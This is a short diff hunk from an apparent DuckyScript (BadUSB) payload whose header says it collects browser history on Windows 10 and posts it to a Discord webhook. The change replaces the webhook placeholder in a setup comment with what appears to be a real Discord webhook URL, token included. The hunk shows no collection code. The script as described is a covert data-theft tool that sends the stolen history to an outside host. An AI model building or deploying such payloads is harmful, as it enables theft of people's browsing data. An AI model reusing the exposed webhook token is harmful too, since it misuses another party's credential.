@@ -4,7 +4,7 @@ REM Description: This script collects browser history and posts results to a dis
 REM Target: Windows 10
 
 REM *SETUP*
-REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+REM replace https://discord.com/api/webhooks/1229459342244450385/RtAUzyIjcwIhnYMqQ-TFRnILFQ6Ozyw_oQZhLLcwWgJQVY6BGTUDhQMIiOBfBtRhL-U9 with your Discord Webhook.
 
 REM some setup for dukie script
 DEFAULT_DELAY 100
